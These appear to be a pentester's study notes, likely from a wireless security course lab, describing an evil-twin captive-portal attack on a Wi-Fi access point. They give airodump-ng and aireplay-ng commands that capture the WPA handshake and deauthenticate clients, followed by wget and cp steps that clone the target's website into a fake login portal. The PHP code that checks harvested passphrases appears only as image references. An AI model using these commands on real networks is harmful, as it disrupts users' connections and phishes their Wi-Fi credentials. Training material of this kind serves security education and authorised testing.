1) Learn about the target AP
	
2) Capture Handshake
	`# airodump-ng -w discovery --output-format pcap -c <AP_channel> wlan0mon`
	`# aireplay-ng -0 0 -a <bssid> wlan0mon` to deauth a client and force to reconnect
3) Building the captive portal (if the network does not have one, you can create one - apache and php needed)
	`# wget -r -l2 https://www.megacorpone.com` to copy the website.
	`# mkdir /var/www/html/portal`
	Create captive portal login page, creating the file like:
	`/var/www/html/portal/index.php`
	![[Pasted image 20221205135858.png]]
	
4) Also, copy the resources from the website to the captive portal folder:
	`# cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/`
	`# cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/`
	
	Create then the file to crack the handshake (``/var/www/html/portal/login_check.php`)
	![[Pasted image 20221206144855.png]]
	![[Pasted image 20221206144820.png]]
	